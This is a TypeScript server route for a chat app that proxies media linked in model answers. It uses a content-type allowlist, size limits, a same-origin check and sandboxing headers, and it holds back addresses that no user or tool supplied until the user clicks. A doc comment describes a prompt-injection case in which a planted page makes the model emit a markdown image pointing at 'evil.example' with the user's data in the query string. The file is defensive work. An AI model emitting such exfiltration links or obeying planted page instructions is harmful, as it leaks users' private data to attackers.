import { Readable } from 'node:stream'
import { Hono } from 'hono'
import { messageText } from '../../shared/messages.ts'
import { knownUrls, normalizedUrl } from '../../shared/media.ts'
import type { StoredItem } from '../../shared/types.ts'
import type { ConversationStore } from '../conversations/index.ts'
import { BlockedAddressError, type MediaProxy } from '../media-proxy.ts'
import { notFound } from './helpers.ts'
import { errorMessage } from '../../shared/errors.ts'

const MB = 1024 * 1024

/** What is passed on, by the site's own `Content-Type`, and how much of it. Never SVG or HTML: they can script. */
const SHOWN: Record<string, number> = {
  'image/png': 20 * MB,
  'image/jpeg': 20 * MB,
  'image/gif': 20 * MB,
  'image/webp': 20 * MB,
  'audio/mpeg': 100 * MB,
  'audio/mp4': 100 * MB,
  'audio/aac': 100 * MB,
  'audio/ogg': 100 * MB,
  'audio/wav': 100 * MB,
  'audio/x-wav': 100 * MB,
  'audio/webm': 100 * MB,
  'video/mp4': 500 * MB,
  'video/webm': 500 * MB,
  'video/ogg': 500 * MB,
}

/** What the user wrote and what tools returned: where an address may come from. */
function sourcesOfAddresses(items: StoredItem[]): string[] {
  return items.flatMap(({ data }) => {
    const message = messageText(data)
    if (message) return message.role === 'user' ? [message.text] : []
    return data.type === 'function_call_output' &&
      typeof data.output === 'string'
      ? [data.output]
      : []
  })
}

/**
 * Images, sound and video that an answer links to, fetched by the server so
 * the page itself never connects to another site. An address nobody could have
 * added data to (one in the chat's user messages or tool results, exactly)
 * loads by itself; any other waits for a click (`confirm=1`). Otherwise a
 * planted page could have the model write `![](https://evil.example/?d=<your
 * data>)` and have it sent without a click.
 */
export function mediaRoutes({
  store,
  media,
}: {
  store: ConversationStore
  media: MediaProxy
}) {
  const app = new Hono()

  app.get('/api/media', async (c) => {
    // Any site can make a browser request this; only chibot's own pages are
    // "same-origin" (curl sends no header at all, and no site can drive it).
    const site = c.req.header('sec-fetch-site')
    if (site && site !== 'same-origin') {
      return c.json({ error: 'Only chibot’s own pages may ask for this' }, 403)
    }
    const conversationId = c.req.query('c')
    const raw = c.req.query('u')
    const address = raw ? normalizedUrl(raw) : null
    if (!conversationId || !address) {
      return c.json(
        { error: 'Give `c` (a chat) and `u` (an http(s) address)' },
        400,
      )
    }
    if (!store.getConversation(conversationId)) return notFound(c)
    if (c.req.query('confirm') !== '1') {
      const known = knownUrls(sourcesOfAddresses(store.getPath(conversationId)))
      if (!known.has(address)) {
        return c.json(
          {
            error: 'Not an address you or a tool gave, so it waits for a click',
          },
          403,
        )
      }
    }

    const range = c.req.header('range')
    let upstream
    try {
      upstream = await media.get(new URL(address), {
        range: range && /^bytes=\d*-\d*$/.test(range) ? range : undefined,
        signal: c.req.raw.signal,
      })
    } catch (err) {
      const status = err instanceof BlockedAddressError ? 403 : 502
      return c.json({ error: errorMessage(err) }, status)
    }

    const { status, headers, body } = upstream
    if (status !== 200 && status !== 206) {
      body.destroy()
      return c.json(
        { error: `The site answered ${status}` },
        status === 404 ? 404 : 502,
      )
    }
    const type = String(headers['content-type'] ?? '')
      .split(';')[0]!
      .trim()
      .toLowerCase()
    const limit = SHOWN[type]
    if (!limit) {
      body.destroy()
      return c.json(
        {
          error: `Can’t show ${type || 'this content'} (only images, sound and video)`,
        },
        415,
      )
    }
    const length = Number(headers['content-length'])
    if (Number.isFinite(length) && length > limit) {
      body.destroy()
      return c.json({ error: 'The file is too large to show here' }, 413)
    }

    let sent = 0
    const capped = (
      Readable.toWeb(body) as ReadableStream<Uint8Array>
    ).pipeThrough(
      new TransformStream<Uint8Array, Uint8Array>({
        transform(chunk, controller) {
          sent += chunk.byteLength
          if (sent > limit) {
            body.destroy()
            controller.error(new Error('The file is too large to show here'))
            return
          }
          controller.enqueue(chunk)
        },
      }),
    )
    const out = new Headers({
      'Content-Type': type,
      // Served from chibot's own address, so never sniffed into anything
      // else, and never run if opened on its own.
      'X-Content-Type-Options': 'nosniff',
      'Content-Security-Policy': "default-src 'none'; sandbox",
      'Cache-Control': 'private, max-age=3600',
      'Accept-Ranges': 'bytes',
    })
    if (Number.isFinite(length)) out.set('Content-Length', String(length))
    const contentRange = headers['content-range']
    if (status === 206 && contentRange) out.set('Content-Range', contentRange)
    return new Response(capped, { status, headers: out })
  })

  return app
}
